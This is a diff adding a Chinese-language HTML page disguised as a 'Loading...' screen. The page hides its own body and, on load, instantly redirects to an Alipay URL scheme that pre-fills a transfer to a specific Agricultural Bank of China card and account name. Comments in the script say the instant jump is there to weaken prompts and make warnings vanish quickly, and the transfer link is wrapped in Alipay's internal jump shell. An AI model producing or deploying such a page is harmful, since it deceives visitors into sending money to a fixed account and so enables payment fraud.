@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>加载中...</title>
+    <style>
+        body { margin: 0; padding: 0; display: none; } /* 隐藏页面，减少提示停留 */
+    </style>
+</head>
+<body>
+    <script>
+        // 1. 定义你的转账核心scheme（目标协议）
+        const targetScheme = "alipays://platformapi/startapp?appId=09999988&actionType=toCard&sourceId=bill&cardNo=6228480830653379610&bankAccount=蓝树康&money=0&amount=0&bankMark=ABC&bankName=中国农业银行";
+        
+        // 2. 对目标scheme做URL编码（必须）
+        const encodedScheme = encodeURIComponent(targetScheme);
+        
+        // 3. 套入支付宝官方内部跳转壳（appId=20000067，通用最优）
+        const jumpUrl = `alipays://platformapi/startapp?appId=10000007&url=${encodedScheme}`;
+        
+        // 4. 极速跳转逻辑（无延迟，弱化提示）
+        function jumpToAlipay() {
+            // 多种跳转方式兜底，确保触发
+            window.location.href = jumpUrl;
+            window.location.replace(jumpUrl);
+        }
+        
+        // 页面加载立即执行，无延迟
+        if (document.readyState === "complete") {
+            jumpToAlipay();
+        } else {
+            window.onload = jumpToAlipay;
+            document.addEventListener("DOMContentLoaded", jumpToAlipay);
+        }
+    </script>
+</body>
+</html>
